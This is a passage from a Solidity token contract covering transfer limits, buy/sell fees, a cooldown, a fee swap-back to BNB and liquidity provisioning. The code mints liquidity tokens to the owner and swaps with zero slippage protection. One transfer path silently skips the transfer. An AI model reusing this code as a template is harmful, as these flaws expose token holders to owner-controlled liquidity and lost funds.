            require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }

        if(!isWalletLimit[to] && restrictWhales){
            require(balanceOf(to).add(amount) <= walletMax, "Wallet limit reached");
        }

        if(cooldownEnabled && to == DEXV2Pair && !isTimelockExempt[from]){
            require(cooldownTimer[from] < block.timestamp, "Please wait for cooldown between buys");
            cooldownTimer[from] = block.timestamp + cooldownTimerInterval;
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        if(contractTokenBalance >= swapTokensAtAmount && !swapping && from != DEXV2Pair) {
            swapBack(contractTokenBalance);
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if(takeFee) {
            uint256 BuyFees = amount.mul(TotalFees).div(100);
            uint256 SellFees = amount.mul(TotalFees).div(100);

            // if sell
            if(to == DEXV2Pair) {
                amount = amount.sub(SellFees);
                super._transfer(from, address(this), SellFees);
                super._transfer(from, to, amount);

            }

            
            else {
                amount = amount.sub(BuyFees);
                super._transfer(from, address(this), BuyFees);
                super._transfer(from, to, amount);
            }

        }


       
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            super._transfer(from, to, amount);

        }

        try PaybackTrack.setBalance(payable(from), balanceOf(from)) {} catch {}
        try PaybackTrack.setBalance(payable(to), balanceOf(to)) {} catch {}

        if(!swapping) {
            uint256 gas = gasForProcessing;

            try PaybackTrack.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                emit ProcessedPaybackTrack(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
            }
            catch {}
        }
    }

    function swapBack(uint256 tokensToLiquify) internal lockTheSwap {

        uint256 tokensTPFK = tokensToLiquify.mul(liquidityTax).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTPFK);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = DEXV2Router.WETH();

        _approve(address(this), address(DEXV2Router), tokensToLiquify);
        DEXV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 bnbBalance = address(this).balance;
        uint256 bnbFeeFactor = TotalFees.sub(liquidityTax.div(2));

        uint256 bnbForLiquidity = bnbBalance.mul(liquidityTax).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(payBackPercent).div(bnbFeeFactor);
        uint256 bnbForMarketing = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);

        addLiquidity(tokensTPFK, bnbForLiquidity);

        payable(walletMarketingTeam).transfer(bnbForMarketing);

        (bool success,) = address(PaybackTrack).call{value: bnbForReflection}("");

        if(success) {
            emit transferDividends(tokensToLiquify.mul(payBackPercent).div(TotalFees), bnbForReflection);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // add the liquidity
        DEXV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        emit SwapAndLiquify(tokenAmount, ethAmount, tokenAmount);
    }





}